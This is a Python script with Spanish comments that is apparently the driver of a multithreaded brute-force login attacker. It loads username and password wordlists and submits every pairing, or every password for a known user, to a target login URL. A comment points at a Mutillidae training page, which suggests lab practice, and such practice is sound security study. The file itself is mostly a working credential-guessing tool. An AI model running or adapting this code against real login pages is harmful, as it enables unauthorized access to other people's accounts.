import parametros as params
import func
from concurrent.futures import ThreadPoolExecutor

#IMPORTANTE: TENGO QUE OPTIMIZAR LAS LISTAS PORQUE CONSUME MUCHA RAM    

#http://128.198.49.198:8102/mutillidae/index.php?page=login.php

try:
    
    # parametros utilizados por defecto
    if params.param.c_u != None:
        c_usuario = params.param.c_u
    else:
        c_usuario = 'username'

    if params.param.c_c != None:

        c_contraseña = params.param.c_c
    else:
        c_contraseña = 'password'

    if params.param.n != None:
        n = params.param.n
    else:
        n = 0

    if params.param.hilos != None:
        hilo = params.param.hilos
    else:
        hilo = 16
    #-------------------------------------


    #conozco el usuario
    if params.param.usuario != None and params.param.dic_u == None:
        
        dic_cont= func.leer_dic(params.param.dic_c)
        
        lista = dic_cont.split()
        
        with ThreadPoolExecutor(max_workers=hilo) as ejec:
            for cont in lista:

                if not func.deteniendo:
                    ejec.submit(func.fb,url_login=params.param.url,usuario=params.param.usuario,c_usuario=c_usuario,c_contr=c_contraseña,contr_=cont,n=n)
                    
                else:
                   ejec.shutdown(wait=False,cancel_futures=True)

    #no conozco el usuario 
    elif params.param.dic_u != None and params.param.usuario == None:
    
        dic_usuario = func.leer_dic(params.param.dic_u)
        dic_contr = func.leer_dic(params.param.dic_c)

        if dic_usuario != None and dic_contr != None:

            print(f'hilos: {hilo}')
            with ThreadPoolExecutor(max_workers=hilo) as ejec:
                for usuario  in dic_usuario.split():
                    
                    for cont  in dic_contr.split():
                        if not func.deteniendo:
                            ejec.submit(func.fb,url_login=params.param.url,usuario=usuario,c_usuario=c_usuario,c_contr=c_contraseña,contr_=cont,n=n)
                   
        else:

            print('hubo un error con los diccionarios')
except KeyboardInterrupt:
    
    exit()
except:
    pass

